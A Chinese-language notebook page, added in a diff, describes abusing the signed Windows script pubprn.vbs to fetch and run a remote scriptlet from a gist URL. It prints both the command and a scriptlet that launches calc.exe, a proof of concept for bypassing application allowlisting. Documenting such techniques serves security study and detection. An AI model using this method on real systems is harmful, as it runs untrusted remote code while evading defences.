@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>pubprn.vbs</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>pubprn.vbs</h1><br/>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()<br /><br />```<br />&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot; 127.0.0.1 script:<a href="https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct">https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</a><br />```<br /><br />test.sct<br />```<br />&lt;?XML version=&quot;1.0&quot;?&gt;<br />&lt;scriptlet&gt;<br />&lt;registration<br />    description=&quot;Bandit&quot;<br />    progid=&quot;Bandit&quot;<br />    version=&quot;1.00&quot;<br />    classid=&quot;{AAAA1111-0000-0000-0000-0000FEEDACDC}&quot;<br />    remotable=&quot;true&quot;<br />    &gt;<br />&lt;/registration&gt;<br />&lt;script language=&quot;JScript&quot;&gt;<br />&lt;![CDATA[<br />        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);<br />]]&gt;<br />&lt;/script&gt;<br />&lt;/scriptlet&gt;<br />```<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
